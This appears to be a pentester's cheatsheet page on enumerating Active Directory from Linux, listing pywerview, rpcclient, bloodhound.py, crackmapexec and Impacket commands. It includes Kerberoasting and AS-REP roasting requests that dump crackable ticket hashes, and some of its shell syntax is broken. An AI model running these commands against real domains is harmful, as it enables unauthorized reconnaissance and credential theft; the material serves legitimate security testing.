---
layout: post
title: TA0007 Discovery - AD Collection & Enumeration with Linux
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2023-06-05
permalink: /pen/discov-ad-lin
---

**Mitre Att&ck Entreprise**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)

**Menu**
<!-- vscode-markdown-toc -->
* [prereq](#prereq)
	* [Setting variables for copy/paste](#Settingvariablesforcopypaste)
* [shoot](#shoot)
	* [shoot-forest](#shoot-forest)
	* [shoot-dom](#shoot-dom)
		* [shoot-pwd-policy](#shoot-pwd-policy)
		* [shoot-delegations](#shoot-delegations)
		* [shoot-priv-users](#shoot-priv-users)
		* [shoot-priv-machines](#shoot-priv-machines)
		* [shoot-shares](#shoot-shares)
		* [shoot-mssql-servers](#shoot-mssql-servers)
		* [shoot-spns](#shoot-spns)
		* [shoot-npusers](#shoot-npusers)
		* [shoot-acls](#shoot-acls)
* [iter](#iter)
	* [iter-memberof](#iter-memberof)
	* [iter-scope](#iter-scope)
* [refresh](#refresh)
	* [check-computer-access](#check-computer-access)
	* [last-logons](#last-logons)
	* [last-logons-computer](#last-logons-computer)
	* [last-logons-ou](#last-logons-ou)
	* [whereis-user](#whereis-user)
	* [whereis-group](#whereis-group)
* [misc](#misc)
	* [Docker Impacket RPCdump](#DockerImpacketRPCdump)
* [sources](#sources)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='prereq'></a>prereq

PRE-REQUISITE:

### <a name='Settingvariablesforcopypaste'></a>Setting variables for copy/paste

Example of ```env.sh``` file :
```bash
#!/bin/bash
export zforest="com"
export zdom="contoso"
export zdom_fqdn=$zdom+"."+$zforest
export zdom_dn="DC=contoso,DC=com"
export zdom_dc="DC001"
export zdom_dc_fqdn=$zdom_dc+"."+$zdom_fqdn
export zdom_dc_san=$zdom_dc+"$"
export zdom_dc_ip="1.2.3.4"
export ztarg_computer="PC001"
export ztarg_computer_fqdn=$ztarg_computer+"."+$zdom_fqdn
export ztarg_computer_san=$ztarg_computer+"$"
export ztarg_computer_ip=""
export ztarg_user_name="xxx"
export ztarg_ou="OU=xxx,"+$zdom_dn
```

To set / verify the variables use the command:
```bash
# set the envs without opening a new shell
. ./env.sh

#verify the envs
env | sort
```

## <a name='shoot'></a>shoot

SHOOT General Properties :

### <a name='shoot-forest'></a>shoot-forest

Forest properties:
```sh
# Enum domains and trusts: V1
pywerview.py get-netdomaintrust -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip

# Enum domains and trusts: V2
rpcclient -U $ztarg_user_name $ztarg_computer_ip  
rpcclient> enumdomains
rpcclient> enumtrusts

# Enum domains and trusts: V3
./bloodhound.py -dc $ztarg_dc_fqdn -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -c Trusts
python
>>> import json
with open ("X.json","r+") as f:                                                                                     
	c = content['data'][0]['Trusts']
	for t in c:
		print(t['TargetDomainName'] + "," + str(t['IsTransitive']) + "," + t['TrustDirection'] + "," + t['TrustType'])

# Get the IP subnetting / IP plan
cut -f1 -d" " trusts.txt > trusts_clean.txt
for i in `cat trusts_clean.txt`; do ping -a $i; done
```

### <a name='shoot-dom'></a>shoot-dom

Domain properties:

```sh
# Identify the DC / DHCP services 
nmap --script broadcast-dhcp-discover
sudo tcpdump -ni eth0 udp port 67 and port 68

dig -t SRV _gc._tcp.$zdom_fqdn
dig -t SRV _ldap._tcp.$zdom_fqdn
dig -t SRV _kerberos._tcp.$zdom_fqdn
dig -t SRV _kpasswd._tcp.$zdom_fqdn

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='$zdom_fqdn'"

nbtscan -r 10.0.0.0/24
```

#### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
```sh
# Get the domain pasword policy
rpcclient -U "johndoe" 10.1.1.1
rpcclient> getdompwinfo
```

#### <a name='shoot-delegations'></a>shoot-delegations

Kerberos Delegations:

Easy enumeration with **Impacket\FindDelegation.py**:

```bash
# with password in the CLI
$zz = $zdom_fqdn + '/' + $ztarg_user_name + ':' + $ztarg_user_pass
.\findDelegation.py  $zz

# with kerberos auth / password not in the CLI
$zz = $zdom_fqdn + '/' + $ztarg_user_name
.\findDelegation.py  $zz -k -no-pass
```

References :
- [thehacker.recipes/ad/movement/kerberos/delegations - KUD / KCD / RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
- [https://attack.mitre.org/techniques/T1134/001/](https://attack.mitre.org/techniques/T1134/001/)

#### <a name='shoot-priv-users'></a>shoot-priv-users

Privileged Users:

- [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)
- [T1003.006](https://attack.mitre.org/techniques/T1003/006) DCSYNC

```powershell
$ztarg_grp="Domain Admins"
#$ztarg_grp="Enterprise Admins"
#$ztarg_grp="Backup Operators"
#$ztarg_grp="Remote Desktop Users"
#$ztarg_grp="DNSAdmins"
```

#### <a name='shoot-priv-machines'></a>shoot-priv-machines

Privileged Machines:
```sh
tbd
```
#### <a name='shoot-shares'></a>shoot-shares
#### <a name='shoot-mssql-servers'></a>shoot-mssql-servers

#### <a name='shoot-spns'></a>shoot-spns
```
# https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> tgs.txt
```

#### <a name='shoot-npusers'></a>shoot-npusers
```
# https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
GetNPUsers.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> np_users.txt 
```

#### <a name='shoot-acls'></a>shoot-acls



## <a name='iter'></a>iter

### <a name='iter-memberof'></a>iter-memberof
User groups:
```bash
# Get user info
python pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd --dc-ip $zdom_dc_ip --username $ztarg_user_name> pt_xxx_getnetuser_x.txt

# Get user info + canarytoken check
# select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount

# Get user memberof info
python pywerview.py get-netgroup -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd --dc-ip $zdom_dc_ip --username $ztarg_user| grep -v "^$" | cut -f2 -d" "  > pt_xxx_getnetgroup_x.txt 

# Get the machine's full-data
python pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd --dc-ip $zdom_dc_ip --computername --full-data | grep 

# Get the machines based on an adspath / OU
ztarg_ou = "OU=Workstations,DC=CONTOSO,DC=COM"
ztarg_adspath = "ldap://" + $ztarg_ou
python pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd -a $ztarg_adspath --dc-ip $zdom_dc_ip | grep -v "^$" | cut -f2 -d" " > pt_xxx_getnetcomputer_ou_x.txt
```

### <a name='iter-scope'></a>iter-scope

Scope of compromise:
```bash
# Find where the account is local admin V1
./bloodhound.py -dc $zdom_dc_ip -d $zdom_fqdn -u $ztarg_user_name -p XXX -c LocalAdmin --computerfile pt_xxx_getnetcomputer_ou_x.txt
cat 2023xxxxxxx_computers.json | jq '.data[] | select(.LocalAdmins.Collected==true)'| jq '.Properties.name' > pt_xxx_fla_pwn.txt

# Find where the account is local admin V2
cme winrm pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
cme smb pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass

# Get the DNs of the owned machines 
# Get the DNs of the owned machines / get the cn computer (1 line) and its DN (1 line)
while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn distinguishedName >> pt_XXX_fla_pwn_dn.txt; done < pt_XXX_fla_pwn.txt
# Get the DNs of the owned machines / format the result returned to CSV
i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_fla_pwn_dn.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_fla_pwn_dn.csv; i=0; fi; done < pt_XXX_fla_pwn_dn.txt

# Get the OS of the owned machines /
# Get the OS of the owned machines / get the cn computer (1 line) and its OS (1 line)
while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> pt_XXX_getcomputer_XXX_os.txt; done < pt_XXX_pwned_machines.txt
# Get the OS of the owned machines / format the result returned to CSV
i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_getnetcomputer_XXX_os.csv; i=0; fi; done < pt_XXX_getcomputer_XXX_os.txt
```

## <a name='refresh'></a>refresh

REFRESH

### <a name='check-computer-access'></a>check-computer-access
### <a name='last-logons'></a>last-logons
### <a name='last-logons-computer'></a>last-logons-computer
### <a name='last-logons-ou'></a>last-logons-ou

Who is logged on a computer:
```bash

```
### <a name='whereis-user'></a>whereis-user
### <a name='whereis-group'></a>whereis-group


## <a name='misc'></a>misc

### <a name='DockerImpacketRPCdump'></a>Docker Impacket RPCdump
```
sudo docker run --rm -it -p 134:135 rflathers/impacket rpcdump.py -port 135 1.3.8.3 > rpcdump_10.3.8.3.txt
```

## <a name='sources'></a>sources

| **Ressource**  | 
|-----------------|
| [Fun with LDAP & Kerberos - ThotCon 2017](https://github.com/jomivz/cybrary/blob/master/purpleteam/red/windows/LDAP%20Service%20and%20Kereberos%20Protocol%20Attacks.pdf) | 
| [AD Enumeration on Linux OS - YT](https://www.youtube.com/watch?v=2Xfd962QfPs) |
| [RPCclient cookbook](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html) |
| [Other LDAP queries examples](https://theitbros.com/ldap-query-examples-active-directory/) |
| [Other LDAP queries examples](https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb) |